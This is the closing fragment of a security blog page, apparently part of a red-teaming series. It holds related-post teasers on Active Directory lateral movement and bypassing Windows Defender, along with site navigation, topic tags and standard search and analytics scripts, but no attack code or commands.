everyone has gone through the first article of this series which explains the basic foundations...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Lateral-Movement/"><div class="card-body"> <em class="timeago small" data-ts="1649404500" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Lateral Movement</h3><div class="text-muted small"><p> Introduction Welcome to my fourth article in the Red Teaming Series (Active Directory Lateral Movement). I hope everyone has gone through the previous articles of this series which go through th...</p></div></div></a></div><div class="card"> <a href="/posts/Bypassing-Windows-Defender/"><div class="card-body"> <em class="timeago small" data-ts="1684074600" > 2023-05-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypassing Windows Defender</h3><div class="text-muted small"><p> Introduction Greetings, everyone 👋. In this brief article, I will outline a manual obfuscation technique for bypassing Windows Defender. Specifically, I will cover how to patch the Antimalware S...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Directory-Lateral-Movement/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Lateral Movement</p></a> <a href="/posts/Active-Directory-Domain-Priv-Esc/" class="btn btn-outline-primary" prompt="Newer"><p>Active Directory - Domain Privilege Escalation</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
